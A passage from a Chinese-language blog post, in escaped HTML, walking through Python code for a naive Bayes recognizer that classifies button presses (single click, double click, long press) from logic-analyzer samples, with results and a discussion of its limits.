nbsp;&nbsp;&nbsp;&nbsp;continue\n\n&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;time_data,&nbsp;signal_data\n</code></pre>\n<p>该函数读取 CSV 文件中的时间戳和信号值，返回两个列表分别存储时间数据和信号数据，通过plot输出采样的数据图如下所示：</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<ol start=\"2\">\n<li>识别器类设计</li>\n</ol>\n<p>核心实现是&nbsp;BayesianButtonRecognizer&nbsp;类，用于实现基于贝叶斯分类的按键模式识别：</p>\n<pre><code class=\"language-python\">class&nbsp;BayesianButtonRecognizer:\n\n&nbsp;&nbsp;&nbsp;&nbsp;\"\"\"基于滑动窗口和贝叶斯更新的按键模式识别器\"\"\"\n\n&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;__init__(self,&nbsp;window_size=20,&nbsp;sample_interval=0.01,&nbsp;\n\n&nbsp;&nbsp;&nbsp;&nbsp;threshold=0.7):\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\"\"\"\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;初始化识别器\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Args:\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;window_size:&nbsp;滑动窗口大小\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sample_interval:&nbsp;采样间隔(秒)\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;threshold:&nbsp;判定阈值\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\"\"\"\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.window_size&nbsp;=&nbsp;window_size\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.sample_interval&nbsp;=&nbsp;sample_interval\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.threshold&nbsp;=&nbsp;threshold\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;滑动窗口存储最近的观测序列\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.window&nbsp;=&nbsp;deque(maxlen=window_size)\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;模式类别\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.modes&nbsp;=&nbsp;['无效',&nbsp;'单击',&nbsp;'双击',&nbsp;'长按']\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;先验概率&nbsp;-&nbsp;初始等可能\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.prior&nbsp;=&nbsp;np.array([0.25,&nbsp;0.25,&nbsp;0.25,&nbsp;0.25])\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;特征提取相关的参数(单位:采样点数)\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.short_press_max&nbsp;=&nbsp;15&nbsp;&nbsp;#&nbsp;短按最大持续时间\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.long_press_min&nbsp;=&nbsp;30&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;长按最小持续时间&nbsp;&nbsp;\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.double_click_interval&nbsp;=&nbsp;10&nbsp;&nbsp;#&nbsp;双击间隔阈值\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;初始化特征分布参数(基于物理理解预设)\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self._init_feature_distributions()\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;特征权重\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.featwight={\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\"无效\":np.array([1.2,0.8,0.8,1.2]),\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\"单击\":np.array([1,1.2,1.2,1]),\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\"双击\":np.array([1,1.2,1.2,0.8]),\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\"长按\":np.array([1.2,0.8,0.8,1.2])\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n</code></pre>\n<ol start=\"3\">\n<li>特征分布初始化</li>\n</ol>\n<p>识别器初始化时设置了各模式下特征的概率分布参数：</p>\n<pre><code class=\"language-python\">def&nbsp;_init_feature_distributions(self):\n\n&nbsp;&nbsp;&nbsp;&nbsp;\"\"\"初始化各模式下特征的概率分布参数\"\"\"\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;高电平占比的分布参数\n\n&nbsp;&nbsp;&nbsp;&nbsp;self.high_ratio_params&nbsp;=&nbsp;{\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'无效':&nbsp;0.05,&nbsp;&nbsp;&nbsp;#&nbsp;无效时高电平占比很低\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'单击':&nbsp;0.2,&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;单击时有短暂高电平\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'双击':&nbsp;0.3,&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;双击时高电平占比稍高\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'长按':&nbsp;0.9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;长按时高电平占比很高\n\n&nbsp;&nbsp;&nbsp;&nbsp;}\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;上升沿数量的分布参数\n\n&nbsp;&nbsp;&nbsp;&nbsp;self.rise_count_params&nbsp;=&nbsp;{\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'无效':&nbsp;0.1,&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;无效时几乎无上升沿\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'单击':&nbsp;1,&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;单击时有1个上升沿\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'双击':&nbsp;2,&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;双击时有2个上升沿&nbsp;&nbsp;\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'长按':&nbsp;0.7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;长按有1个上升沿\n\n&nbsp;&nbsp;&nbsp;&nbsp;}\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;最长高电平持续时间的分布参数(正态分布:均值,标准差)\n\n&nbsp;&nbsp;&nbsp;&nbsp;self.max_duration_params&nbsp;=&nbsp;{\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'无效':&nbsp;(0,&nbsp;2),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;无效时持续时间很短\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'单击':&nbsp;(0.2,&nbsp;5),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;单击中等持续时间\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'双击':&nbsp;(0.17,&nbsp;3),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;双击每次按下时间短\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'长按':&nbsp;(0.9,&nbsp;10)&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;长按持续时间长\n\n&nbsp;&nbsp;&nbsp;&nbsp;}\n</code></pre>\n<ol start=\"4\">\n<li>特征提取</li>\n</ol>\n<p>从滑动窗口数据中提取特征，其中高电平占比是通过求序列平均值来获得的，然后边沿计数对应了记录序列跳变数量，最长高电平时间通过记录连续高电平时长获取：</p>\n<pre><code class=\"language-python\">def&nbsp;extract_features(self,&nbsp;window_data):\n\n&nbsp;&nbsp;&nbsp;&nbsp;\"\"\"从滑动窗口数据中提取特征\"\"\"\n\n&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(window_data)&nbsp;==&nbsp;0:\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;None\n\n&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;np.array(window_data)\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;特征1:&nbsp;高电平占比\n\n&nbsp;&nbsp;&nbsp;&nbsp;high_ratio&nbsp;=&nbsp;np.mean(data)\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;特征2:&nbsp;上升沿数量(0-&gt;1的变化)\n\n&nbsp;&nbsp;&nbsp;&nbsp;rises&nbsp;=&nbsp;0\n\n&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(1,&nbsp;len(data)):\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;data[i-1]&nbsp;==&nbsp;0&nbsp;and&nbsp;data[i]&nbsp;==&nbsp;1:\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rises&nbsp;+=&nbsp;1\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;特征3:&nbsp;下降沿数量(1-&gt;0的变化)\n\n&nbsp;&nbsp;&nbsp;&nbsp;falls&nbsp;=&nbsp;0\n\n&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(1,&nbsp;len(data)):\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;data[i-1]&nbsp;==&nbsp;1&nbsp;and&nbsp;data[i]&nbsp;==&nbsp;0:\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;falls&nbsp;+=&nbsp;1\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;特征4:&nbsp;最长连续高电平持续时间\n\n&nbsp;&nbsp;&nbsp;&nbsp;max_duration&nbsp;=&nbsp;0\n\n&nbsp;&nbsp;&nbsp;&nbsp;current_duration&nbsp;=&nbsp;0\n\n&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;val&nbsp;in&nbsp;data:\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;val&nbsp;==&nbsp;1:\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;current_duration&nbsp;+=&nbsp;1\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;max_duration&nbsp;=&nbsp;max(max_duration,&nbsp;current_duration)\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;current_duration&nbsp;=&nbsp;0\n\n&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;{\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'high_ratio':&nbsp;high_ratio,\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'rise_count':&nbsp;rises,&nbsp;\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'fall_count':&nbsp;falls,\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'max_duration':&nbsp;max_duration\n\n&nbsp;&nbsp;&nbsp;&nbsp;}\n</code></pre>\n<ol start=\"5\">\n<li>似然概率计算</li>\n</ol>\n<p>计算给定模式下观测到特征值的似然概率，即条件概率，通过上面定义的分布参数，使用<code>正态分布</code>近似，在python中通过<code>stats.norm.pdf</code>求特征对应每个模式的似然程度，然后基于条件独立的假设，求解联合似然，表示样本对某一模式的最终似然结果：</p>\n<pre><code class=\"language-python\">def&nbsp;calculate_likelihood(self,&nbsp;features,&nbsp;mode):\n\n&nbsp;&nbsp;&nbsp;&nbsp;\"\"\"计算给定模式下观测到特征值的似然概率\"\"\"\n\n&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;features&nbsp;is&nbsp;None:\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;1.0&nbsp;&nbsp;#&nbsp;无特征时返回中性似然\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;使用概率密度函数计算各特征的似然\n\n&nbsp;&nbsp;&nbsp;&nbsp;likelihoods&nbsp;=&nbsp;[]\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;1.&nbsp;高电平占比的似然\n\n&nbsp;&nbsp;&nbsp;&nbsp;target_ratio&nbsp;=&nbsp;self.high_ratio_params[mode]\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;使用正态分布近似,&nbsp;标准差根据经验设定\n\n&nbsp;&nbsp;&nbsp;&nbsp;like_ratio&nbsp;=&nbsp;stats.norm.pdf(features['high_ratio'],&nbsp;\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;target_ratio,&nbsp;0.2)\n\n&nbsp;&nbsp;&nbsp;&nbsp;likelihoods.append(like_ratio&nbsp;+&nbsp;1e-10)&nbsp;&nbsp;#&nbsp;避免零\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;2.&nbsp;上升沿数量的似然\n\n&nbsp;&nbsp;&nbsp;&nbsp;target_rises&nbsp;=&nbsp;self.rise_count_params[mode]\n\n&nbsp;&nbsp;&nbsp;&nbsp;like_rises&nbsp;=&nbsp;stats.norm.pdf(features['rise_count'],&nbsp;\n\n&nbsp;&nbsp;&nbsp;&nbsp;target_rises,0.3)\n\n&nbsp;&nbsp;&nbsp;&nbsp;likelihoods.append(like_rises&nbsp;+&nbsp;1e-10)\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;3.&nbsp;下降沿(同上升沿)数量的似然\n\n&nbsp;&nbsp;&nbsp;&nbsp;target_falls&nbsp;=&nbsp;self.rise_count_params[mode]\n\n&nbsp;&nbsp;&nbsp;&nbsp;like_falls&nbsp;=&nbsp;stats.norm.pdf(features['fall_count'],&nbsp;\n\n&nbsp;&nbsp;&nbsp;&nbsp;target_falls,0.3)\n\n&nbsp;&nbsp;&nbsp;&nbsp;likelihoods.append(like_falls&nbsp;+&nbsp;1e-10)\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;4.&nbsp;最长持续时间的似然(使用正态分布)\n\n&nbsp;&nbsp;&nbsp;&nbsp;target_dur,&nbsp;std_dur&nbsp;=&nbsp;self.max_duration_params[mode]\n\n&nbsp;&nbsp;&nbsp;&nbsp;target_dur&nbsp;*=&nbsp;self.window_size\n\n&nbsp;&nbsp;&nbsp;&nbsp;like_duration&nbsp;=&nbsp;stats.norm.pdf(features['max_duration'],&nbsp;\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;target_dur,&nbsp;std_dur)\n\n&nbsp;&nbsp;&nbsp;&nbsp;likelihoods.append(like_duration&nbsp;+&nbsp;1e-10)\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;组合各特征的似然(假设特征条件独立)\n\n&nbsp;&nbsp;&nbsp;&nbsp;total_likelihood&nbsp;=&nbsp;np.prod(np.array(likelihoods))\n\n&nbsp;&nbsp;&nbsp;&nbsp;print(\"特征在mode[%s]的似然：\"%{mode},likelihoods,\"最终联合似然:%.\n\n&nbsp;&nbsp;&nbsp;&nbsp;3f\"%total_likelihood)\n\n&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;total_likelihood\n</code></pre>\n<ol start=\"6\">\n<li>滑动窗口更新</li>\n</ol>\n<pre><code class=\"language-python\">def&nbsp;slide_window(self,io_state):\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;移除最旧的值\n\n&nbsp;&nbsp;&nbsp;&nbsp;self.window.popleft()\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;将新观测值加入滑动窗口\n\n&nbsp;&nbsp;&nbsp;&nbsp;self.window.append(io_state)\n</code></pre>\n<ol start=\"7\">\n<li>信念更新与模式判断</li>\n</ol>\n<p>计算完样本对每个模式的似然后，就于先验概率相乘，就得到了后验概率，然后归一化得到最终结果，同时使用阈值判定机制，当最大后验超过判定阈值后，才会识别具体模式，否则就是不确定</p>\n<pre><code class=\"language-python\">def&nbsp;update_belief(self,&nbsp;io_state):\n\n&nbsp;&nbsp;&nbsp;&nbsp;\"\"\"根据新观测值更新信念\"\"\"\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;提取当前窗口的特征\n\n&nbsp;&nbsp;&nbsp;&nbsp;features&nbsp;=&nbsp;self.extract_features(self.window)\n\n&nbsp;&nbsp;&nbsp;&nbsp;print(\"特征提取：\",features)\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;计算各模式的似然\n\n&nbsp;&nbsp;&nbsp;&nbsp;likelihoods&nbsp;=&nbsp;np.array([self.calculate_likelihood(features,&nbsp;\n\n&nbsp;&nbsp;&nbsp;&nbsp;mode)&nbsp;\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;mode&nbsp;in&nbsp;self.modes])\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;贝叶斯更新:&nbsp;后验&nbsp;∝&nbsp;似然&nbsp;×&nbsp;先验\n\n&nbsp;&nbsp;&nbsp;&nbsp;unnormalized_posterior&nbsp;=&nbsp;likelihoods&nbsp;*&nbsp;self.prior\n\n&nbsp;&nbsp;&nbsp;&nbsp;evidence&nbsp;=&nbsp;np.sum(unnormalized_posterior)\n\n&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;evidence&nbsp;&gt;&nbsp;0:\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;posterior&nbsp;=&nbsp;unnormalized_posterior&nbsp;/&nbsp;evidence\n\n&nbsp;&nbsp;&nbsp;&nbsp;else:\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;posterior&nbsp;=&nbsp;self.prior.copy()\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;更新先验(用于下一次迭代)\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;self.prior&nbsp;=&nbsp;posterior\n\n&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;判断当前模式\n\n&nbsp;&nbsp;&nbsp;&nbsp;best_mode_idx&nbsp;=&nbsp;np.argmax(posterior)\n\n&nbsp;&nbsp;&nbsp;&nbsp;best_prob&nbsp;=&nbsp;posterior[best_mode_idx]\n\n&nbsp;&nbsp;&nbsp;&nbsp;print(\"后验：\",posterior)\n\n&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;best_prob&nbsp;&gt;&nbsp;self.threshold:\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;detected_mode&nbsp;=&nbsp;self.modes[best_mode_idx]\n\n&nbsp;&nbsp;&nbsp;&nbsp;else:\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;detected_mode&nbsp;=&nbsp;'不确定'\n\n&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;detected_mode,&nbsp;posterior\n</code></pre>\n<ol start=\"8\">\n<li>主函数与演示</li>\n</ol>\n<p>因为定义了高电平为有效电平，但实际中低电平，或者说下降沿是按键动作的反应，所以处理数据序列时做了相应的取反处理。</p>\n<pre><code class=\"language-python\">if&nbsp;__name__&nbsp;==&nbsp;\"__main__\":\n\n&nbsp;&nbsp;&nbsp;&nbsp;DeltaT&nbsp;=&nbsp;0.01 # 采样间隔\n\n&nbsp;&nbsp;&nbsp;&nbsp;UnitTime&nbsp;=&nbsp;1e-06 # 原始数据点的时基\n\n&nbsp;&nbsp;&nbsp;&nbsp;SampleInterval&nbsp;=&nbsp;math.floor(DeltaT&nbsp;/&nbsp;UnitTime)\n\n&nbsp;&nbsp;&nbsp;&nbsp;filename&nbsp;=&nbsp;\"key_data_20s_all.csv\"&nbsp;&nbsp;#&nbsp;逻辑分析仪导出的数据\n\n&nbsp;&nbsp;&nbsp;&nbsp;recognizer&nbsp;=&nbsp;BayesianButtonRecognizer(window_size=100,&nbsp;\n\n&nbsp;&nbsp;&nbsp;&nbsp;threshold=0.8)\n\n&nbsp;&nbsp;&nbsp;&nbsp;recognizer.reset()\n\n&nbsp;&nbsp;&nbsp;&nbsp;time_data,&nbsp;signal_data&nbsp;=&nbsp;read_sigrok_csv_simple(filename)\n\n&nbsp;&nbsp;&nbsp;&nbsp;print(f\"成功读取数据，共&nbsp;{len(time_data)}&nbsp;个数据点\")\n\n&nbsp;&nbsp;&nbsp;&nbsp;print(f\"时间范围:&nbsp;{time_data[0]}s&nbsp;到&nbsp;{time_data[-1]}s\")\n\n&nbsp;&nbsp;&nbsp;&nbsp;plt.figure(1)\n\n&nbsp;&nbsp;&nbsp;&nbsp;sample_data&nbsp;=&nbsp;[]\n\n&nbsp;&nbsp;&nbsp;&nbsp;res_data&nbsp;=&nbsp;[]\n\n&nbsp;&nbsp;&nbsp;&nbsp;sample_num&nbsp;=&nbsp;math.floor(len(signal_data)&nbsp;/&nbsp;SampleInterval)\n\n&nbsp;&nbsp;&nbsp;&nbsp;print(\"sample&nbsp;size&nbsp;is:\",sample_num)\n\n&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(sample_num-1):\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sample_data.append(int(not&nbsp;signal_data[SampleInterval*i]))\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;recognizer.slide_window(int(not&nbsp;signal_data\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[SampleInterval*i]))\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;i%recognizer.window_size==0:\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res,postrior=recognizer.update_belief(i)\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(res&nbsp;not&nbsp;in[\"不确定\",\"无效\"]):\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res_data.append(res)\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(\"win[%d]:\"%i,res)\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;plt.plot(recognizer.window)\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;plt.show()\n\n&nbsp;&nbsp;&nbsp;&nbsp;plt.figure(1)\n\n&nbsp;&nbsp;&nbsp;&nbsp;plt.plot(sample_data)\n\n&nbsp;&nbsp;&nbsp;&nbsp;plt.show()\n\n&nbsp;&nbsp;&nbsp;&nbsp;print(res_data)\n</code></pre>\n<p>当窗口中样本序列是理想情况时，识别效果相当好：</p>\n<p>无效样本示例：</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>上图是一个无效按键样本序列图，保持无效电平，没有边沿变化。下图给出了识别的过程和结果：</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>可以看到特征提取的信息是正确的，高电平占比为0，边沿计数为0，最长高电平延时为0，在各个模式的似然列表中，给出了对应的似然结果，同时从列数据对比来看，也可以直接从数值上看出样本特征更偏向哪个模式，最终的后验结果，确实是无效模式的概率最高，即判定窗口中的序列为无效。</p>\n<p>单击样本示例：</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>上图是一个单击按键样本序列图，有边沿变化，一个上升沿，一个下降沿，高电平占比大约0.2。下图给出了识别的过程和结果：</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>可以看到特征提取的信息是正确的，最终的识别结果也是正确的</p>\n<p>双击样本示例：</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>上图是一个双击样本的示例图，可以看到由两个高电平组成，下图给出识别过程和结果：</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>可以看出特征提取信息正确，有两个上升沿和两个下降沿，然后最终的后验概率中也是双击的概率最大，并且超过阈值判定正确。</p>\n<p>下面给出一些因为信号完整性缺失造成的误判示例。</p>\n<p>边界双击情况示例：</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>上图中可以看出很明显是一个双击的动作，但是由于窗口长度固定的原因，导致一部分序列缺失，下图给出识别结果：</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>特征提取的信息倒是正确的，识别出下降沿只有1个，在计算似然过程中，相应位置的似然结果也反应了这一点，最终的后验表中可以看到前两个大的概率是单击和双击，但是都没超过阈值，所以判定为不确定</p>\n<p>边界单击情况示例：</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>可以看出这个情况像是单击，但是实际上是一段长按序列，下图给出识别过程：</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>特征信息提取是正确的，然后似然结果都偏低，表示不偏向某一个模式，但在最终的后验结果中单击的后验概率异常的高，应该是在归一化过程中，单击概率占比比其他概率大很多导致的，这也是同样的问题，也就是信号完整性缺失导致了误判</p>\n<h2 id=\"总结\">总结</h2>\n<p>在这次实验中，基于朴素贝叶斯分类方法，通过<em>滑动窗口</em>采集数据、提取多维度特征、计算概率分布和应用贝叶斯更新，学到了不少，也融合了很多内容，算是一次不小的学习体验吧，虽然目前测试下来效果有限，还无法真正用在项目中，也总结了一些不足的地方。</p>\n<p>比如信号完整性保证不了，不同特征属性对不同模式的权重实际并不一致等，这些都是需要解决的问题，虽然对现在的我来说很困难，但探索新方法的过程还是蛮喜欢的，也可能是对现有方法的审美疲劳导致的吧。</p>\n<p>但有一说一，传统的方法，还是简单高效的，也不涉及到什么数学的内容，全凭逻辑加判断就可以搞定了，真是省时省力啊。</p>\n\n\n</div>\n<div id=\"MySignature\">\n   